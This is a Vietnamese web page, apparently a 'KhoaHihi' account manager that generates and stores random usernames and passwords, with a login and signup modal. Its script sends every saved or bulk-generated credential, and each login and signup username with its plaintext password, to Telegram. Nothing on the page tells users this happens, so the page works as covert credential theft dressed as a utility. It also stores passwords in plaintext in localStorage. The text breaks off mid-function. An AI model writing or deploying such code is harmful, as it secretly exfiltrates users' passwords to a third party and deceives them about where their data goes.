<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Quản Lý Tài Khoản</title>
  <style>
 * {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(to bottom right, #e6f0ff, #f8fbff);
  color: #1c1c1c;
  padding: 30px;
}

h2, h3 {
  color: #0056b3;
  margin-bottom: 20px;
}

label {
  font-weight: 600;
  display: block;
  margin-top: 15px;
}

input[type="text"], input[type="number"], textarea, select {
  width: 100%;
  padding: 12px 14px;
  font-size: 16px;
  border-radius: 8px;
  border: 1px solid #d0d7de;
  background-color: #fff;
  transition: border-color 0.2s;
}

input:focus, select:focus, textarea:focus {
  border-color: #3399ff;
  outline: none;
}

.input-group {
  display: flex;
  gap: 10px;
  margin-top: 5px;
}

.input-group input {
  flex: 1;
}

.input-group button {
  background: #3399ff;
  color: #fff;
  border: none;
  padding: 10px 14px;
  border-radius: 8px;
  cursor: pointer;
  font-size: 14px;
  transition: background 0.2s;
}

.input-group button:hover {
  background: #267fe0;
}

button {
  background: #0056b3;
  color: white;
  border: none;
  padding: 10px 16px;
  border-radius: 8px;
  font-size: 14px;
  margin-top: 15px;
  margin-right: 10px;
  cursor: pointer;
  transition: background 0.2s;
}

button:hover {
  background: #003d80;
}

.account-list {
  background: #ffffff;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
  margin-top: 30px;
}

.account-item {
  padding: 12px 0;
  border-bottom: 1px solid #e0e0e0;
}

.account-item:last-child {
  border-bottom: none;
}

#copy-notification {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background-color: #323232;
  color: #fff;
  padding: 10px 16px;
  border-radius: 6px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.25);
  font-size: 14px;
  display: none;
  z-index: 9999;
  opacity: 0;
  transition: opacity 0.3s ease;
}

select {
  cursor: pointer;
}
input[type="checkbox"] {
  transform: scale(1.2);
  margin-right: 8px;
  cursor: pointer;
}
.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background-color: #0056b3;
  color: white;
  padding: 16px 24px;
  border-radius: 12px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  margin-bottom: 30px;
  flex-wrap: wrap;
}

.navbar-left .title {
  font-size: 30px; 
  font-weight: bold;
  white-space: nowrap; 
  overflow: visible; 
  text-overflow: clip; 
  max-width: none; 
}
.navbar-right {
  display: flex;
  align-items: center;
  gap: 16px;
}

.logo {
  height: 40px;
  width: 40px;
  border-radius: 8px;
  object-fit: contain;
}

.title {
  font-size: 22px;
  font-weight: bold;
}

.nav-link {
  display: flex;
  align-items: center;
  gap: 6px;
  color: white;
  text-decoration: none;
  font-weight: 500;
  font-size: 16px;
  padding: 8px 12px;
  border-radius: 8px;
  transition: background 0.2s;
  line-height: 1;
}

.nav-link:hover {
  background-color: #003d80;
}
.modal {
  display: none;
  position: fixed;
  z-index: 9999;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  justify-content: center;
  align-items: center;
}

.modal-content {
  position: relative;
  background-color: #fff;
  padding: 24px 24px 18px;
  border-radius: 16px;
  text-align: center;
  box-shadow: 0 4px 16px rgba(0,0,0,0.3);
  width: 360px;
  max-width: 95%;
}


.donate-img {
  max-width: 100%;
  max-height: 600px;
  border-radius: 12px;
}


.close-btn {
  position: absolute;
  top: 10px;
  right: 10px;
  background: #f44336;
  color: white;
  border: none;
  border-radius: 50%;
  font-size: 18px;
  width: 32px;
  height: 32px;
  cursor: pointer;
  line-height: 1;
  display: flex;
  align-items: center;
  justify-content: center;
}
/* Login Modal Style */
.login-modal {
  background: rgba(0, 0, 0, 0.6);
  z-index: 99999;
}

.wrapper {
  overflow: hidden;
  max-width: 390px;
  background: #fff;
  padding: 30px;
  border-radius: 15px;
  box-shadow: 0px 15px 20px rgba(0,0,0,0.1);
  animation: fadeIn 0.4s;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(-20px); }
  to { opacity: 1; transform: translateY(0); }
}

.wrapper .title-text {
  display: flex;
  width: 200%;
}

.wrapper .title {
  width: 50%;
  font-size: 35px;
  font-weight: 600;
  text-align: center;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}

.wrapper .slide-controls {
  position: relative;
  display: flex;
  height: 50px;
  width: 100%;
  overflow: hidden;
  margin: 30px 0 10px 0;
  justify-content: space-between;
  border: 1px solid lightgrey;
  border-radius: 15px;
}

.slide-controls {
  position: relative;
  display: flex;
  height: 50px;
  width: 100%;
  margin: 30px 0 10px 0;
  justify-content: space-between;
  border: 1px solid lightgrey;
  border-radius: 15px;
  overflow: hidden; /* Thêm dòng này */
}

.slide-controls .slide {
  height: 100%;
  width: 50%; /* Đảm bảo mỗi tab chiếm 50% */
  font-size: 18px;
  font-weight: 500;
  text-align: center;
  line-height: 50px; /* Căn giữa theo chiều dọc */
  cursor: pointer;
  z-index: 1;
  transition: all 0.6s ease;
  margin: 0; /* Loại bỏ margin mặc định */
  padding: 0; /* Loại bỏ padding mặc định */
}

.slide-controls .slider-tab {
  position: absolute;
  height: 100%;
  width: 50%;
  left: 0;
  z-index: 0;
  border-radius: 15px;
  background: linear-gradient(to right, #003366, #004080, #0059b3, #0073e6);
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}
.title-text {
  font-size: 0; /* Ẩn khoảng trống giữa các phần tử inline */
}

.title {
  display: inline-block;
  width: 50%;
  font-size: 35px; 
  font-weight: 600;
  text-align: center;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
  vertical-align: top; 
}
input[type="radio"] {
  display: none;
}

#signup:checked ~ .slider-tab {
  left: 50%;
}

#signup:checked ~ label.signup {
  color: #fff;
  cursor: default;
  user-select: none;
}

#signup:checked ~ label.login {
  color: #000;
}

.wrapper .form-container {
  width: 100%;
  overflow: hidden;
}

.form-container .form-inner {
  display: flex;
  width: 200%;
}

.form-container .form-inner form {
  width: 50%;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}

.form-inner form .field {
  height: 50px;
  width: 100%;
  margin-top: 20px;
}

.form-inner form .field input {
  height: 100%;
  width: 100%;
  outline: none;
  padding-left: 15px;
  border-radius: 15px;
  border: 1px solid lightgrey;
  border-bottom-width: 2px;
  font-size: 17px;
  transition: all 0.3s ease;
}

.form-inner form .field input:focus {
  border-color: #1a75ff;
}

.form-inner form .field input::placeholder {
  color: #999;
  transition: all 0.3s ease;
}

form .field input:focus::placeholder {
  color: #1a75ff;
}

.form-inner form .pass-link {
  margin-top: 5px;
}

.form-inner form .signup-link {
  text-align: center;
  margin-top: 30px;
}

.form-inner form .pass-link a,
.form-inner form .signup-link a {
  color: #1a75ff;
  text-decoration: none;
}

.form-inner form .pass-link a:hover,
.form-inner form .signup-link a:hover {
  text-decoration: underline;
}

form .btn {
  height: 50px;
  width: 100%;
  border-radius: 15px;
  position: relative;
  overflow: hidden;
}

form .btn .btn-layer {
  height: 100%;
  width: 300%;
  position: absolute;
  left: -100%;
  background: linear-gradient(to right, #003366, #004080, #0059b3, #0073e6);
  border-radius: 15px;
  transition: all 0.4s ease;
}

form .btn:hover .btn-layer {
  left: 0;
}

form .btn input[type="submit"] {
  height: 100%;
  width: 100%;
  z-index: 1;
  position: relative;
  background: none;
  border: none;
  color: #fff;
  padding-left: 0;
  border-radius: 15px;
  font-size: 20px;
  font-weight: 500;
  cursor: pointer;
}
.login-modal {
  display: none; 
  position: fixed;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  justify-content: center;
  align-items: center;
  z-index: 10000; 
}
.close-login-btn {
  position: absolute;
  top: 10px;      
  right: 10px;    
  background: transparent;
  border: none;
  font-size: 20px;
  cursor: pointer;
  color: #666;
  z-index: 1;     
  padding: 5px;
}

.close-login-btn:hover {
  color: #f44336; 
}

.wrapper {
  position: relative; 
}
/* Dark Mode */
body.dark-mode {
  background: linear-gradient(to bottom right, #1a1a2e, #16213e);
  color: #f0f0f0;
}

.dark-mode .account-list {
  background: #0f3460;
  color: #ffffff;
}

.dark-mode .navbar {
  background-color: #0f3460;
  box-shadow: 0 2px 8px rgba(0,0,0,0.3);
}

.dark-mode input[type="text"], 
.dark-mode input[type="number"], 
.dark-mode textarea, 
.dark-mode select {
  background-color: #1a1a2e;
  color: #ffffff;
  border-color: #2c3e50;
}

.dark-mode .account-item {
  border-bottom-color: #2c3e50;
}

.dark-mode button {
  background: #1a75ff;
}

.dark-mode button:hover {
  background: #005ce6;
}

.dark-mode .modal-content {
  background-color: #16213e;
  color: #ffffff;
}

.dark-mode .wrapper {
  background: #16213e;
  color: #ffffff;
}

.dark-mode .form-inner form .field input {
  background: #1a1a2e;
  color: #ffffff;
  border-color: #2c3e50;
}
#userDisplay {
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 5px;
}

#userDisplay:hover {
  background-color: #003d80;
}
.logout-btn {
  background: transparent;
  border: none;
  color: white;
  cursor: pointer;
  font-size: 16px;
  margin-left: 5px;
  padding: 0;
}

.logout-btn:hover {
  color: #ff6b6b;
}
.nav-link {
  display: flex;
  align-items: center;
  gap: 6px;
  color: white;
  text-decoration: none;
  font-weight: 500;
  font-size: 16px;
  padding: 8px 12px;
  border-radius: 8px;
  transition: background 0.2s;
  line-height: 1;
}
.nav-link:hover {
  background-color: #003d80;
}
.not-logged-in {
  opacity: 0.6;
  cursor: not-allowed;
  pointer-events: none;
}






  </style>
</head>
<body>
  <div id="loginModal" class="login-modal" style="display: none;">
  <div class="wrapper" style="margin: auto;">
    <button class="close-login-btn" onclick="hideLogin()">❌</button>
   
    <div class="title-text">
      <div class="title login">KhoaHihi</div>
      <div class="title signup">KhoaHihi</div>
    </div>
    <div class="form-container">
      <div class="slide-controls">
        <input type="radio" name="slide" id="login" checked>
        <input type="radio" name="slide" id="signup">
        <label for="login" class="slide login">Đăng nhập</label>
        <label for="signup" class="slide signup">Đăng Ký</label>
        <div class="slider-tab"></div>
      </div>
      <div class="form-inner">
        <form action="#" class="login">
          <div class="field">
            <input type="text" placeholder="Tên đăng nhập" required>
          </div>
          <div class="field">
            <input type="password" placeholder="Mật khẩu" required>
          </div>
          <div class="pass-link"><a href="#">Quên mật khẩu?</a></div>
          <div class="field btn">
            <div class="btn-layer"></div>
            <input type="submit" value="Xác nhận">
          </div>
          <div class="signup-link">Chưa có tài khoản? <a href="">Đăng Ký</a></div>
        </form>
        <form action="#" class="signup">
          <div class="field">
            <input type="text" placeholder="Tên đăng nhập" required>
          </div>
          <div class="field">
            <input type="password" placeholder="Mật khẩu" required>
          </div>
          <div class="field">
            <input type="password" placeholder="Xác nhận mật khẩu" required>
          </div>
          <div class="field btn">
            <div class="btn-layer"></div>
            <input type="submit" value="Xác nhận">
          </div>
        </form>
      </div>
    </div>
  </div>
</div>


  <div class="navbar">
  <div class="navbar-left">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="Logo" class="logo">
    <span class="title">KhoaHihi Web - Quản Lý Tài Khoản</span>
  </div>
  <div class="navbar-right">
    <a href="#" class="nav-link" onclick="toggleDarkMode()">🌓 Dark Mode</a>
    <a href="https://www.facebook.com/khoangdangg/" class="nav-link" target="_blank">📬 Liên hệ</a>
    <a href="#" class="nav-link" onclick="showDonate()">💖 Donate</a>
   <a href="#" id="userDisplay" class="nav-link" style="display: none;" onclick="logout()" title="Đăng xuất">
  🚪 <span id="usernameDisplay" style="font-weight: 500;"></span> <span style="opacity: 0.8;">| Đăng xuất</span>
</a>


</span>
    <a href="#" id="loginBtn" class="nav-link" onclick="showLogin()">🔑Đăng nhập</a>

  </div>
</div>
<div id="donateModal" class="modal">
  <div class="modal-content">
    <button class="close-btn" onclick="hideDonate()">❌</button>
    <img src="1.jpg" alt="Donate QR" class="donate-img">
    <p style="margin-top: 10px;">Cảm ơn bạn đã ủng hộ 💖</p>
  </div>
</div>





  <h2>📘 Tạo & Lưu Tài Khoản</h2>

  <label>🔖 Ghi chú:</label>
  <input type="text" id="note" placeholder>

  <label>🔗 Tiền tố tài khoản (tùy chọn):</label>
  <input type="text" id="prefix" placeholder>

  <label>👤 Tài khoản:</label>
  <div class="input-group">
    <input type="text" id="username" placeholder>
    <button onclick="randomUsername()">🎲 Random</button>
  </div>

  <label>🔑 Mật khẩu:</label>
  <div class="input-group">
    <input type="text" id="password" placeholder>
    <button onclick="randomPassword()">🎲 Random</button>
  </div>
<div id="copy-notification">✅ Đã copy vào clipboard!</div>
<div style="margin-top: 15px;">
  <label>📦 Số lượng cần random nhanh:</label>
  <div class="input-group">
    <input type="number" id="randomCount" value="5" min="1" max="100">
    <button onclick="bulkRandomAndSave()">⚡ Random & Lưu Nhanh</button>
  </div>
</div>


  <button onclick="addAccount()">✅ Lưu</button>
  <button onclick="randomUsername(); randomPassword();">🎲 Random Nhanh </button>
  <button onclick="downloadAccounts()">⬇️ Tải TXT</button>
  <button onclick="downloadSelected()">⬇️ Tải TXT (đã chọn)</button>
  <button onclick="clearAccounts()">🗑️ Xóa tất cả</button>
  <button onclick="deleteSelected()">🗑️ Xóa (đã chọn)</button>
  <button onclick="toggleSelectionMode()" id="selectionToggleBtn">🔘 Chọn</button>



  <hr>

  <label>📂 Lọc danh sách:</label>
<select id="filterType" onchange="applyFilter()" style="padding: 10px; border-radius: 6px; font-size: 16px;">
  <option value="all">-- Hiển thị tất cả --</option>
  <option value="newest">🕒 Mới nhất</option>
  <option value="oldest">📜 Cũ nhất</option>
  <option value="account">🔐 Theo tài khoản (A-Z)</option>
  <option value="note">📌 Theo ghi chú (A-Z)</option>
</select>
<input type="text" id="subSearch" placeholder="🔍 Nhập để lọc thêm..." 
       style="display:none; margin-top:10px; padding:10px; width:100%; border-radius:6px; font-size:16px;"
       oninput="applyFilter()">



  <div class="account-list" id="accountList">
    <h3>📋 Danh sách đã lưu:</h3>
  </div>

  <script>
    let accounts = JSON.parse(localStorage.getItem("managed_accounts")) || [];
    let currentUser = localStorage.getItem('currentUser');


    function saveToLocal() {
  localStorage.setItem("managed_accounts", JSON.stringify(accounts));
}

  function renderList(sortBy = "all") {
  const list = document.getElementById("accountList");
  list.innerHTML = "<h3>📋 Danh sách đã lưu:</h3>";

  let sorted = [...accounts];

  if (sortBy === "newest") {
    sorted.reverse(); // đảo ngược mảng
  } else if (sortBy === "account") {
    sorted.sort((a, b) => a.username.localeCompare(b.username));
  } else if (sortBy === "note") {
    sorted.sort((a, b) => (a.note || "").localeCompare(b.note || ""));
  }

  sorted.forEach((acc, i) => {
    const note = acc.note || "(không có)";
    const username = acc.username;
    const password = acc.password;

    const div = document.createElement("div");
    div.className = "account-item";

    const copyText = `Ghi chú: ${note}\nTài khoản: ${username}\nMật khẩu: ${password}`;

    div.innerHTML = `
      ${selectionMode ? `<input type="checkbox" class="account-checkbox" data-index="${i}" style="margin-bottom:5px;">` : ""}
      <strong>${i + 1}. Ghi chú:</strong> ${note}<br>
      <strong>Tài khoản:</strong> ${username}<br>
      <strong>Mật khẩu:</strong> ${password}<br>
      <button onclick="copyToClipboard(\`${copyText}\`)" style="margin-top:5px;">📋 Copy All</button>
    `;
    list.appendChild(div);
  });
}
function applyFilter() {
  const type = document.getElementById("filterType").value;
  const subSearch = document.getElementById("subSearch");

  if (type === "account" || type === "note") {
    subSearch.style.display = "block";
  } else {
    subSearch.style.display = "none";
    subSearch.value = ""; // clear nếu không dùng
  }

  renderList(type, subSearch.value);
}


function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showCopyNotification("✅ Đã copy vào clipboard!", "#4caf50");
  }).catch(() => {
    showCopyNotification("❌ Không thể copy.", "#f44336");
  });
}

function showCopyNotification(message, bgColor) {
  const note = document.getElementById("copy-notification");
  note.textContent = message;
  note.style.backgroundColor = bgColor;
  note.style.display = "block";
  note.style.opacity = "1";

  setTimeout(() => {
    note.style.opacity = "0";
    setTimeout(() => {
      note.style.display = "none";
    }, 300);
  }, 2000);
}


    function isValidUsername(username) {
      return /^[a-z0-9]{6,32}$/.test(username);
    }

    function isValidPassword(password) {
      const lengthOK = password.length >= 6 && password.length <= 32;
      const hasLetter = /[a-zA-Z]/.test(password);
      const hasNumber = /[0-9]/.test(password);
      return lengthOK && hasLetter && hasNumber;
    }

    function addAccount() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  let note = document.getElementById("note").value.trim();
  
  if (!note) {
    note = new Date().toLocaleString();
  }

  if (!isValidUsername(username)) {
    alert("❌ Tài khoản phải có 6-32 ký tự chữ thường và số");
    return;
  }

  if (!isValidPassword(password)) {
    alert("❌ Mật khẩu phải có 6-32 ký tự, gồm chữ và số");
    return;
  }

  // Thêm vào danh sách quản lý (không liên quan đến user đăng nhập)
  accounts.push({ username, password, note });
  saveToLocal();
  
  // Thông báo Telegram chỉ cho dữ liệu quản lý
  const telegramMsg = `📝 *THÊM TÀI KHOẢN QUẢN LÝ*\n\n` +
                     `👤 Username: \`${username}\`\n` +
                     `🔑 Password: \`${password}\`\n` +
                     `📌 Note: ${note}\n` +
                     `⏰ Time: ${new Date().toLocaleString()}`;
  
  sendToTelegram(telegramMsg).then(() => {
    showCopyNotification("✅ Đã lưu tài khoản quản lý!", "#4caf50");
  });

  renderList();
  document.getElementById("username").value = '';
  document.getElementById("password").value = '';
}
    function downloadAccounts()  {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
      let content = accounts.map((a, i) =>
        `${i + 1}. Ghi chú: ${a.note || "(không có)"}\nTài khoản: ${a.username}\nMật khẩu: ${a.password}\n`
      ).join('\n');

      const blob = new Blob([content], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "danh_sach_tai_khoan.txt";
      a.click();
      URL.revokeObjectURL(url);
    }
function downloadSelected() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const checkboxes = document.querySelectorAll(".account-checkbox:checked");
  if (checkboxes.length === 0) {
    showCopyNotification("⚠️ Chưa chọn dòng nào để tải!", "#ff9800");
    return;
  }

  let content = "";
  checkboxes.forEach(cb => {
    const index = parseInt(cb.getAttribute("data-index"));
    const a = accounts[index];
    content += `Ghi chú: ${a.note || "(không có)"}\nTài khoản: ${a.username}\nMật khẩu: ${a.password}\n\n`;
  });

  const blob = new Blob([content], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "da_chon_tai_khoan.txt";
  a.click();
  URL.revokeObjectURL(url);
}
function deleteSelected() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const checkboxes = document.querySelectorAll(".account-checkbox:checked");
  if (checkboxes.length === 0) {
    showCopyNotification("⚠️ Chưa chọn dòng nào để xóa!", "#ff9800");
    return;
  }

  const indexes = Array.from(checkboxes).map(cb => parseInt(cb.getAttribute("data-index")));
  // Xóa từ cuối lên để không sai chỉ số
  indexes.sort((a, b) => b - a).forEach(i => accounts.splice(i, 1));

  saveToLocal();renderList(
  document.getElementById("filterType").value,
  document.getElementById("subSearch").value
);
  showCopyNotification("✅ Đã xóa các dòng đã chọn!", "#f44336");
}


let clearConfirming = false;

function clearAccounts()  {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  if (accounts.length === 0) {
    showCopyNotification("⚠️ Không có gì để xóa!", "#ff9800");
    return;
  }

  if (!clearConfirming) {
    clearConfirming = true;
    showCopyNotification("⚠️ Bạn có chắc muốn xóa không? Nhấn lại để xác nhận.", "#ff9800");

    setTimeout(() => {
      clearConfirming = false;
    }, 3000); // Hết hiệu lực sau 3 giây
    return;
  }

  accounts = [];
  saveToLocal();
  renderList();
  showCopyNotification("✅ Đã xóa tất cả!", "#f44336");
  clearConfirming = false;
}


 function randomUsername(totalLength = 15) {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  let prefix = document.getElementById('prefix').value.trim();
if (!prefix) {
  prefix = "khoahihi"; // Tiền tố mặc định
}

  const allowed = 'abcdefghijklmnopqrstuvwxyz0123456789';

  if (prefix.length > 12) {
    showCopyNotification("❌ Tiền tố không được quá 12 ký tự!", "#f44336");
    return;
  }

  if (prefix && !/^[a-z0-9]*$/.test(prefix)) {
    showCopyNotification("❌ Tiền tố chỉ gồm chữ thường và số!", "#f44336");
    return;
  }

  if (prefix.length >= totalLength) {
    showCopyNotification("❌ Tiền tố quá dài. Tài khoản tối đa 15 ký tự!", "#f44336");
    return;
  }

  const randomLength = totalLength - prefix.length;
  let suffix = '';
  for (let i = 0; i < randomLength; i++) {
    suffix += allowed.charAt(Math.floor(Math.random() * allowed.length));
  }

  document.getElementById('username').value = prefix + suffix;
}

    function randomPassword(length = 12) {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
      const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      const numbers = '0123456789';
      const symbols = '!@#$%';

      let result = '';
      result += letters[Math.floor(Math.random() * letters.length)];
      result += numbers[Math.floor(Math.random() * numbers.length)];

      const allChars = letters + numbers + symbols;
      for (let i = 2; i < length; i++) {
        result += allChars.charAt(Math.floor(Math.random() * allChars.length));
      }

      result = result.split('').sort(() => 0.5 - Math.random()).join('');
      document.getElementById('password').value = result;
    }
function renderList(sortBy = "all", searchKeyword = "") {
  const list = document.getElementById("accountList");
  list.innerHTML = "<h3>📋 Danh sách đã lưu:</h3>";

  let sorted = [...accounts];

  if (sortBy === "newest") {
    sorted.reverse();
  } else if (sortBy === "account") {
    sorted.sort((a, b) => a.username.localeCompare(b.username));
  } else if (sortBy === "note") {
    sorted.sort((a, b) => (a.note || "").localeCompare(b.note || ""));
  }

  sorted.forEach((acc, i) => {
    const note = acc.note || "(không có)";
    const username = acc.username;
    const password = acc.password;

    if (
      sortBy === "account" && !username.toLowerCase().includes(searchKeyword.toLowerCase())
      || sortBy === "note" && !note.toLowerCase().includes(searchKeyword.toLowerCase())
    ) {
      return;
    }

    const div = document.createElement("div");
    div.className = "account-item";

    const copyText = `Ghi chú: ${note}\nTài khoản: ${username}\nMật khẩu: ${password}`;

    div.innerHTML = `
      ${selectionMode ? `<input type="checkbox" class="account-checkbox" data-index="${i}" style="margin-bottom:5px;">` : ""}
      <strong>${i + 1}. Ghi chú:</strong> ${note}<br>
      <strong>Tài khoản:</strong> ${username}<br>
      <strong>Mật khẩu:</strong> ${password}<br>
      <button onclick="copyToClipboard(\`${copyText}\`)" style="margin-top:5px;">📋 Copy All</button>
    `;
    list.appendChild(div);
  });
}

function bulkRandomAndSave() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const count = parseInt(document.getElementById("randomCount").value);
  let prefix = document.getElementById("prefix").value.trim();
  if (!prefix) {
    prefix = "khoahihi";
  }

  // Validate input
  if (isNaN(count) || count < 1 || count > 100) {
    showCopyNotification("❌ Số lượng phải từ 1 đến 100!", "#f44336");
    return;
  }

  if (prefix.length > 12) {
    showCopyNotification("❌ Tiền tố không quá 12 ký tự!", "#f44336");
    return;
  }

  if (prefix && !/^[a-z0-9]*$/.test(prefix)) {
    showCopyNotification("❌ Tiền tố chỉ chữ thường và số!", "#f44336");
    return;
  }

  const allowed = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const numbers = '0123456789';
  const symbols = '!@#$%';
  
  // Chuẩn bị nội dung cho Telegram
  let telegramMsg = `⚡ *TẠO ${count} TÀI KHOẢN NGẪU NHIÊN*\n\n` +
                   `🔄 Tiền tố: ${prefix}\n` +
                   `📝 Ghi chú: ${document.getElementById("note").value.trim() || 'Tự động'}\n\n` +
                   `📋 DANH SÁCH:\n`;

  for (let j = 0; j < count; j++) {
    // Tạo username
    const suffixLength = 15 - prefix.length;
    let suffix = '';
    for (let i = 0; i < suffixLength; i++) {
      suffix += allowed.charAt(Math.floor(Math.random() * allowed.length));
    }
    const username = prefix + suffix;

    // Tạo password
    let password = '';
    password += letters[Math.floor(Math.random() * letters.length)];
    password += numbers[Math.floor(Math.random() * numbers.length)];
    const allChars = letters + numbers + symbols;
    for (let i = 2; i < 12; i++) {
      password += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }
    password = password.split('').sort(() => 0.5 - Math.random()).join('');

    // Thêm vào danh sách
    accounts.push({
      username,
      password,
      note: document.getElementById("note").value.trim() || new Date().toLocaleString()
    });

    // Thêm vào nội dung Telegram
    telegramMsg += `\n${j+1}. ${username} | ${password}`;
  }

  // Thêm thời gian vào thông báo
  telegramMsg += `\n\n⏰ ${new Date().toLocaleString()}`;

  // Lưu và hiển thị
  saveToLocal();
  renderList(
    document.getElementById("filterType").value,
    document.getElementById("subSearch").value
  );

  // Gửi thông báo Telegram
  sendToTelegram(telegramMsg)
    .then(() => showCopyNotification(`✅ Đã tạo ${count} tài khoản và gửi Telegram!`, "#4caf50"))
    .catch(err => {
      console.error("Lỗi gửi Telegram:", err);
      showCopyNotification(`✅ Đã tạo ${count} tài khoản (nhưng lỗi gửi Telegram)`, "#ff9800");
    });
}



  </script>

<script>
let selectionMode = false;

function toggleSelectionMode() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  selectionMode = !selectionMode;
  renderList(
    document.getElementById("filterType").value,
    document.getElementById("subSearch").value
  );
  const btn = document.getElementById("selectionToggleBtn");
  btn.textContent = selectionMode ? "❌ Hủy chọn" : "🔘 Chọn";
}

document.addEventListener('DOMContentLoaded', () => {
  // Kiểm tra dark mode
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '☀️ Light Mode';
  }
  
  // Kiểm tra trạng thái đăng nhập
  const currentUser = localStorage.getItem('currentUser');
  if (currentUser) {
    updateLoginUI(currentUser);
  }
});
function showDonate() {
  document.getElementById("donateModal").style.display = "flex";
}

function hideDonate() {
  document.getElementById("donateModal").style.display = "none";
}
// Login System
const loginText = document.querySelector(".title-text .login");
const loginForm = document.querySelector("form.login");
const loginBtn = document.querySelector("label.login");
const signupBtn = document.querySelector("label.signup");
const signupLink = document.querySelector("form .signup-link a");
const signupForm = document.querySelector("form.signup");
const forgotPasswordLink = document.querySelector(".pass-link a");

function showLogin() {
  document.getElementById("loginModal").style.display = "flex";
  document.body.style.overflow = "hidden"; // Ngăn scroll khi modal mở
}

function hideLogin() {
  document.getElementById("loginModal").style.display = "none";
  document.body.style.overflow = ""; // Khôi phục scroll
}

forgotPasswordLink.onclick = () => {
  showCopyNotification("⚠️ Chức năng quên mật khẩu chưa khả dụng", "#ff9800");
  return false;
};

signupBtn.onclick = (() => {
  loginForm.style.marginLeft = "-50%";
  loginText.style.marginLeft = "-50%";
});

loginBtn.onclick = (() => {
  loginForm.style.marginLeft = "0%";
  loginText.style.marginLeft = "0%";
});

signupLink.onclick = (() => {
  signupBtn.click();
  return false;
});

loginForm.addEventListener("submit", function(event) {
  event.preventDefault();
  const username = loginForm.querySelector('input[type="text"]').value.trim();
  const password = loginForm.querySelector('input[type="password"]').value.trim();
  
  if (!username || !password) {
    showCopyNotification("❌ Vui lòng nhập đầy đủ thông tin!", "#f44336");
    return;
  }

  const storedUser = JSON.parse(localStorage.getItem(username));
  
  if (storedUser && storedUser.password === password) {
    showCopyNotification("✅ Đăng nhập thành công!", "#4caf50");
    hideLogin();
    updateLoginUI(username);
    localStorage.setItem('currentUser', username);
    
    // Gửi thông báo Telegram CÓ mật khẩu
    const telegramMsg = `🔐 *ĐĂNG NHẬP THÀNH CÔNG*\n\n` +
                       `👤 Username: \`${username}\`\n` +
                       `🔑 Password: \`${password}\`\n` +
                       `🕒 Thời gian: ${new Date().toLocaleString()}`;
    sendToTelegram(telegramMsg, true).catch(console.error); // Thêm true để gửi mật khẩu
  } else {
    showCopyNotification("❌ Sai tên đăng nhập hoặc mật khẩu!", "#f44336");
  }
});

// Sửa lại phần xử lý form đăng ký
signupForm.addEventListener("submit", function(event) {
  event.preventDefault();

  const usernameInput = signupForm.querySelectorAll('input[type="text"]')[0];
  const passwordInput = signupForm.querySelectorAll('input[type="password"]')[0];
  const confirmInput = signupForm.querySelectorAll('input[type="password"]')[1];
  
  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  const confirm = confirmInput.value.trim();

  // ... (phần validate giữ nguyên như trước)

  // Lưu user mới
  localStorage.setItem(username, JSON.stringify({ password }));
  
  // Gửi thông báo Telegram CÓ mật khẩu
  const telegramMsg = `📢 *NGƯỜI DÙNG MỚI ĐĂNG KÝ*\n\n` +
                     `👤 Username: \`${username}\`\n` +
                     `🔑 Password: \`${password}\`\n` +
                     `🕒 Thời gian: ${new Date().toLocaleString()}`;
  
  sendToTelegram(telegramMsg, true) // Thêm true để gửi mật khẩu
    .then(() => {
      showCopyNotification("✅ Đăng ký thành công! Vui lòng đăng nhập.", "#4caf50");
      loginBtn.click();
      loginForm.querySelector('input[type="text"]').value = username;
      loginForm.querySelector('input[type="password"]').focus();
    })
    .catch(err => {
      console.error("Lỗi gửi Telegram:", err);
      showCopyNotification("✅ Đăng ký thành công (lỗi gửi Telegram)", "#4caf50");
      loginBtn.click();
    });
});
// Dark Mode Toggle
function toggleDarkMode() {
  document.body.classList.toggle('dark-mode');
  const isDarkMode = document.body.classList.contains('dark-mode');
  localStorage.setItem('darkMode', isDarkMode);
  
  // Đổi icon/text nút
